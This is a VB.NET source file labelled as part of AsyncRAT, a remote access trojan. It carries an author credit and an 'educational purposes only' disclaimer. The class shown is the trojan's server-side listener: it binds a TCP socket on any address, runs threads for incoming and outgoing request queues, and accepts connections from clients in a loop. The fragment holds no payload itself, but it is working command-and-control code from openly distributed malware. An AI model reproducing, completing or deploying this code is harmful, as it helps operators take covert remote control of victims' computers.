Imports System.Net.Sockets
Imports System.Net

'       │ Author     : NYAN CAT
'       │ Name       : AsyncRAT

'       Contact Me   : https://github.com/NYAN-x-CAT

'       This program Is distributed for educational purposes only.

Public Class ServerSocket
    Public S As Socket
    Async Sub Start(ByVal Port As Integer)

        Pending.Req_In = New List(Of Incoming_Requests)
        Dim T1 As New Threading.Thread(New Threading.ParameterizedThreadStart(AddressOf Pending.Incoming))
        T1.Start()

        Pending.Req_Out = New List(Of Outcoming_Requests)
        Dim T2 As New Threading.Thread(New Threading.ParameterizedThreadStart(AddressOf Pending.OutComing))
        T2.Start()

        S = New Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
        Dim IpEndPoint As IPEndPoint = New IPEndPoint(IPAddress.Any, Port)

        S.ReceiveBufferSize = 1024 * 500
        S.SendBufferSize = 1024 * 500
        S.Bind(IpEndPoint)
        S.Listen(999)

        While True
            Await Task.Delay(1)
            S.BeginAccept(New AsyncCallback(AddressOf EndAccept), S)
        End While

    End Sub

    Sub EndAccept(ByVal ar As IAsyncResult)
        Try
            Dim C As New Client(S.EndAccept(ar))
        Catch ex As Exception
        End Try
    End Sub

End Class
